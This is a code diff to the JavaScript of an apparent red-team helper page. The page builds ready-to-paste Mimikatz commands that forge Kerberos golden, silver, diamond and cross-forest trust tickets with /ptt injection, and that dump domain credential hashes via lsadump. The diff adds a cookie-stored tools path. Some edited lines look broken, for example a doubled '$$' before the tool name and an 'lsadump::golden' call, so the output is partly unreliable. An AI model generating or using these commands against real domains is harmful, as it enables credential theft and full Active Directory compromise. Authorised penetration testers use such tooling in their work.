@@ -1,5 +1,6 @@
 // Global
 var tool = "mimikatz.exe";
+var toolsPath = document.getElementById('tools-path').value = getCookie('tools-path') || '';
 
 // Prevent Default for all forms
 var forms = document.getElementsByTagName("form");
@@ -53,9 +54,9 @@ function generateCrossForestCommand() {
 	flags = `"kerberos::golden /User:${user} /domain:${currentDomain} /sid:${currentDomainSID} /target:${targetDomain} /service:${service} /rc4:${trustNtlm} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;
 
 	if (tool == "invoke-mimikatz") {
-		command = `Invoke-Mimikatz -Command '${flags}'`;
+		command = `${tool} -Command '${flags}'`;
 	} else {
-		command = `${tool} ${flags}`;
+		command = `${toolsPath}${tool} ${flags}`;
 	}
 
 	document.querySelector("#command-cross-forest").value = command;
@@ -82,7 +83,7 @@ function generateInterForestCommand() {
 	if (tool == "invoke-mimikatz") {
 		command = `Invoke-Mimikatz -Command '${flags}'`;
 	} else {
-		command = `${tool} ${flags}`;
+		command = `${toolsPath}${tool} ${flags}`;
 	}
 	
 	document.querySelector("#command-sid-injection").value = command;	
@@ -103,9 +104,9 @@ function generateKerberosTicketsCommand(form_id) {
 		flags = `"kerberos::golden /User:${user} /domain:${targetDomain} /service:${service} /rc4:${rc4} /aes256:${aes256} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;
 
 		if (tool == "invoke-mimikatz") {
-			command = `Invoke-Mimikatz -Command '${flags}'`;
+			command = `$${tool} -Command '${flags}'`;
 		} else {
-			command = `${tool} ${flags}`;
+			command = `${toolsPath}${tool} ${flags}`;
 		}
 		document.querySelector("#command-silver").value = command;
 		
@@ -121,7 +122,7 @@ function generateKerberosTicketsCommand(form_id) {
 		flags = `"kerberos::golden /User:${user} /domain:${targetDomain} /rc4:${rc4} /aes256:${aes256} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;
 
 		if (tool == "invoke-mimikatz") {
-			command = `Invoke-Mimikatz -Command '${flags}'`;
+			command = `${tool} -Command '${flags}'`;
 		} else {
 			command = `${tool} ${flags}`;
 		}
@@ -140,9 +141,9 @@ function generateKerberosTicketsCommand(form_id) {
 		flags = `"kerberos::golden /User:${user} /domain:${targetDomain} /service:${service} /rc4:${rc4} /aes256:${aes256} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;
 
 		if (tool == "invoke-mimikatz") {
-			command = `Invoke-Mimikatz -Command '${flags}'`;
+			command = `${tool} -Command '${flags}'`;
 		} else {
-			command = `${tool} ${flags}`;
+			command = `${toolsPath}${tool} ${flags}`;
 		}
 
 		document.querySelector("#command-diamond").value = command;
@@ -151,15 +152,16 @@ function generateKerberosTicketsCommand(form_id) {
 }
 
 // Funtion to generateDumpHashesCommand
-// Invoke-Mimi -Command '"lsadump::lsa /patch"'
 function generateDumpHashesCommand() {
 	var user = document.querySelector("#form-dc-sync #user").value;
 	var netbios = document.querySelector("#form-dc-sync #netbios").value;
 
-	var command = `${tool} "lsadump::golden /user:${netbios}\\${user}" "exit"`;
+	var flags = `"lsadump::golden /user:${netbios}\\${user}" "exit"`;
 
 	if (tool == "invoke-mimikatz") {
-		var command = `${tool} -Command "lsadump::dcsync /user:${netbios}\\${user}" "exit"`;
+		var command = `${tool} -Command '${flags}'`;
+	} else {
+		var command = `${toolsPath}\${tool} ${flags}`;
 	}
 
 	document.querySelector("#command-dump-hashes").value = command;
@@ -204,20 +206,18 @@ function fillFormInputs() {
 	document.getElementById('user').value = getCookie('user') || '';
 	document.getElementById('trust-ntlm').value = getCookie('trust-ntlm') || '';
 	document.getElementById('target-domain').value = getCookie('target-domain') || '';
+	document.getElementById('tools-path').value = getCookie('tools-path') || '';
 }
 
 // Clipboard
 function copyToClipboard() {
 	var commandInput = document.getElementById('command');
 	commandInput.select();
-	document.execCommand('copy');
+	document.execCommand('copy')
 }
 
 // Call fillFormInputs function when the page loads
 window.onload = fillFormInputs;
 
 // Add event listeners to form inputs to update cookies and form inputs when the user types
-var formInputs = document.querySelectorAll('.form-control');
-formInputs.forEach(function(input) {
-	input.addEventListener('input', updateCookieAndInput);
-});
+document.getElementById('form-global').addEventListener('input', updateCookieAndInput);
